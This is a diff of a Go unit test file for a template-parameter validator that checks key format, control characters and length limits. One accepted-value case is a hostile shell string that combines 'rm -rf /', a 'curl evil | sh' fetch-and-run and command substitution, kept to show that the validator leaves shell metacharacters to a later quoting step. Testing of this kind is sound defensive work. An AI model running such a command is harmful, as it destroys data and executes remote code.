@@ -1,6 +1,6 @@
-package core_test
+package core
 
-// templateparams_test.go — unit tests for core.ValidateTemplateParams (WG-045
+// templateparams_test.go — unit tests for ValidateTemplateParams (WG-045
 // ingestion hygiene). Defense-in-depth: reject malformed keys, control chars
 // (NUL/newline/tab), and over-length values before a value can reach substitution.
 
@@ -8,8 +8,6 @@ import (
 	"errors"
 	"strings"
 	"testing"
-
-	"github.com/gregberns/harmonik/internal/core"
 )
 
 func TestValidateTemplateParams_AcceptsValid(t *testing.T) {
@@ -21,10 +19,10 @@ func TestValidateTemplateParams_AcceptsValid(t *testing.T) {
 		// Shell metacharacters in VALUES are deliberately allowed — neutralising
 		// them is the shell-quoting close's job, not the validator's.
 		{"CMD": "x; rm -rf / && curl evil | sh $(touch pwned)`echo`"},
-		{"A1_B2": strings.Repeat("v", core.MaxTemplateParamValueBytes)}, // exactly at cap
+		{"A1_B2": strings.Repeat("v", MaxTemplateParamValueBytes)}, // exactly at cap
 	}
 	for i, p := range ok {
-		if err := core.ValidateTemplateParams(p); err != nil {
+		if err := ValidateTemplateParams(p); err != nil {
 			t.Errorf("case %d: expected valid, got error: %v", i, err)
 		}
 	}
@@ -39,12 +37,12 @@ func TestValidateTemplateParams_RejectsControlChars(t *testing.T) {
 		"del":     "x\x7fy",
 	}
 	for label, v := range bad {
-		err := core.ValidateTemplateParams(map[string]string{"SID": v})
+		err := ValidateTemplateParams(map[string]string{"SID": v})
 		if err == nil {
 			t.Errorf("%s: expected rejection for control char in value %q, got nil", label, v)
 			continue
 		}
-		var ie *core.ErrInvalidTemplateParam
+		var ie *ErrInvalidTemplateParam
 		if !errors.As(err, &ie) {
 			t.Errorf("%s: expected *ErrInvalidTemplateParam, got %T", label, err)
 		}
@@ -54,12 +52,12 @@ func TestValidateTemplateParams_RejectsControlChars(t *testing.T) {
 func TestValidateTemplateParams_RejectsBadKey(t *testing.T) {
 	bad := []string{"sid", "1ABC", "A-B", "A.B", "A B", "", "a_b"}
 	for _, k := range bad {
-		err := core.ValidateTemplateParams(map[string]string{k: "v"})
+		err := ValidateTemplateParams(map[string]string{k: "v"})
 		if err == nil {
 			t.Errorf("key %q: expected rejection, got nil", k)
 			continue
 		}
-		var ie *core.ErrInvalidTemplateParam
+		var ie *ErrInvalidTemplateParam
 		if !errors.As(err, &ie) {
 			t.Errorf("key %q: expected *ErrInvalidTemplateParam, got %T", k, err)
 		}
@@ -67,8 +65,8 @@ func TestValidateTemplateParams_RejectsBadKey(t *testing.T) {
 }
 
 func TestValidateTemplateParams_RejectsOverLengthValue(t *testing.T) {
-	over := strings.Repeat("v", core.MaxTemplateParamValueBytes+1)
-	err := core.ValidateTemplateParams(map[string]string{"BIG": over})
+	over := strings.Repeat("v", MaxTemplateParamValueBytes+1)
+	err := ValidateTemplateParams(map[string]string{"BIG": over})
 	if err == nil {
 		t.Fatal("expected rejection for over-length value, got nil")
 	}
@@ -78,8 +76,8 @@ func TestValidateTemplateParams_RejectsOverLengthValue(t *testing.T) {
 }
 
 func TestValidateTemplateParams_RejectsOverLengthKey(t *testing.T) {
-	longKey := strings.Repeat("K", core.MaxTemplateParamKeyBytes+1)
-	err := core.ValidateTemplateParams(map[string]string{longKey: "v"})
+	longKey := strings.Repeat("K", MaxTemplateParamKeyBytes+1)
+	err := ValidateTemplateParams(map[string]string{longKey: "v"})
 	if err == nil {
 		t.Fatal("expected rejection for over-length key, got nil")
 	}
